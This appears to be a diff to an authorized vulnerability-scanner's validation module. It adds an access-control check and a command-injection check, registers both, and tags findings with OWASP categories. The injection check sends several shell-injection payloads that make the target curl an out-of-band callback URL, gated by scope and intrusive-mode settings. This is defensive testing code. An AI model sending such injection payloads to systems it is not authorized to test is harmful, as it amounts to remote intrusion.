@@ -399,6 +399,70 @@ class JwtValidator(Validator):
         return Validation("unverified", self.name, detail=f"alg '{alg}' not auto-checked")
 
 
+class AccessControlValidator(Validator):
+    name = "access-control"
+
+    def matches(self, f: Finding) -> bool:
+        t = f.title.lower()
+        return any(k in t for k in ("access control", "idor", "forced brows",
+                                    "unauthenticated", "admin panel", "missing auth"))
+
+    def run(self, f: Finding, scope: Scope) -> Validation:
+        if not scope.is_in_scope(f.target):
+            return Validation("skipped", self.name, detail="target out of scope")
+        status, _, body = _http(f.target)
+        looks_login = any(k in body.lower() for k in ("login", "sign in", "password", "unauthorized"))
+        if status == 200 and not looks_login:
+            return Validation("confirmed", self.name,
+                              evidence=f"{f.target} returns HTTP 200 without authentication",
+                              detail="Sensitive resource reachable with no access control.")
+        if status in (401, 403):
+            return Validation("not_confirmed", self.name, detail=f"HTTP {status} — access controlled")
+        return Validation("not_confirmed", self.name,
+                          detail=f"HTTP {status}{' (login page)' if looks_login else ''}")
+
+
+class CommandInjectionValidator(Validator):
+    name = "command-injection"
+
+    def matches(self, f: Finding) -> bool:
+        t = f.title.lower()
+        return any(k in t for k in ("command inject", "os command", "rce",
+                                    "remote code", "code execution"))
+
+    def run(self, f: Finding, scope: Scope) -> Validation:
+        if not scope.is_in_scope(f.target):
+            return Validation("skipped", self.name, detail="target out of scope")
+        # Confirming command injection executes a command on the target, so it is
+        # active exploitation: require intrusive + an OOB listener. The injected
+        # command is a benign callback (no writes/deletes), just enough to prove RCE.
+        if not scope.intrusive:
+            return Validation("unverified", self.name,
+                              detail="active check: enable intrusive + set oob_url to confirm RCE")
+        if not scope.oob_url:
+            return Validation("unverified", self.name,
+                              detail="set scope.oob_url (an OOB listener) to confirm blind RCE")
+        from .oob import OobClient
+        client = OobClient(scope.oob_url)
+        token = client.new_token()
+        cb = client.callback_url(token)
+        param = f.metadata.get("param", "cmd")
+        for payload in (f";curl {cb};", f"|curl {cb}", f"$(curl {cb})",
+                        f"& curl {cb} &", f"`curl {cb}`"):
+            try:
+                _http(_with_param(f.target, param, payload))
+            except Exception:  # noqa: BLE001
+                pass
+        hits = client.wait_for(token, timeout=8)
+        if hits:
+            return Validation("confirmed", self.name,
+                              evidence=f"OOB callback from {hits[0].get('src_ip')} "
+                                       f"(command executed on target, token {token[:8]})",
+                              detail="Remote command execution confirmed via out-of-band callback.")
+        return Validation("not_confirmed", self.name,
+                          detail="no callback — not injectable, or egress blocked")
+
+
 def _b64url_decode(data: str) -> bytes:
     return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))
 
@@ -412,26 +476,36 @@ _REGISTRY: list[Validator] = [
     GitExposedValidator(), DirectoryListingValidator(), SecurityHeaderValidator(),
     OpenRedirectValidator(), ReflectedXssValidator(), LfiValidator(),
     SqlInjectionValidator(), CorsValidator(), SsrfValidator(), JwtValidator(),
-    BlindXssValidator(),
+    BlindXssValidator(), AccessControlValidator(), CommandInjectionValidator(),
 ]
 
 
 def validate_findings(result, scope: Scope,
                       on_each: Callable[[Finding], None] | None = None) -> int:
     """Attach a Validation to each finding a validator can confirm. Returns count confirmed."""
+    from . import owasp
     scope.require_authorized()
     confirmed = 0
     for f in result.findings:
         validator = next((v for v in _REGISTRY if v.matches(f)), None)
         if validator is None:
             f.validation = Validation("unverified", detail="no safe auto-validator for this type")
-            continue
-        try:
-            f.validation = validator.run(f, scope)
-        except Exception as exc:  # noqa: BLE001
-            f.validation = Validation("error", validator.name, detail=f"{type(exc).__name__}: {exc}")
-        if f.validation.status == "confirmed":
-            confirmed += 1
+        else:
+            try:
+                f.validation = validator.run(f, scope)
+            except Exception as exc:  # noqa: BLE001
+                f.validation = Validation("error", validator.name, detail=f"{type(exc).__name__}: {exc}")
+            # Tag the finding with the OWASP category this validator covers.
+            cat = owasp.VALIDATOR_OWASP.get(validator.name)
+            if cat:
+                f.metadata["owasp"] = cat
+            if f.validation.status == "confirmed":
+                confirmed += 1
+        # Ensure every finding has an OWASP category (keyword fallback).
+        if not f.metadata.get("owasp"):
+            cat = owasp.categorize(f)
+            if cat:
+                f.metadata["owasp"] = cat
         if on_each:
             on_each(f)
     return confirmed
